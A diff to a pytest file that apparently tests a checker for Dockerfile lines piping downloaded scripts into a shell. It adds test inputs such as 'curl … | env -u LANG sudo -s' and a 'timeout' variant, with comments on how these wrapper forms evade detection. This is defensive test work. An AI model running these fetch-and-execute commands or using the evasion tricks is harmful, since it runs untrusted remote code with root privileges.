@@ -269,6 +269,17 @@ def test_nothing_pipes_a_downloaded_script_into_a_shell(path: Path):
             "RUN curl -sSL https://x.example/i.sh | nice -n 5 sudo -s\n",
             id="nice-operand-then-sudo",
         ),
+        # A wrapper FLAG's own operand is not a command either. `LANG` is not numeric, so the
+        # walk stopped on it and never reached sudo -- while the line executes the download:
+        #   printf 'echo PWNED\n' | env -u LANG sudo -n -s     ->  PWNED
+        #   printf 'echo PWNED\n' | timeout -k 5 30 sudo -n -s ->  PWNED
+        pytest.param(
+            "RUN curl -sSL https://x.example/i.sh | env -u LANG sudo -s\n", id="env-unset-then-sudo"
+        ),
+        pytest.param(
+            "RUN curl -sSL https://x.example/i.sh | timeout -k 5 30 sudo -s\n",
+            id="timeout-kill-after-then-sudo",
+        ),
         # `--shell=` FUSED. Exact-matching `--shell` missed it, and the selected program is a
         # shell:  printf 'echo PWNED\n' | sudo -n runuser --shell=/bin/sh root  ->  PWNED
         pytest.param(
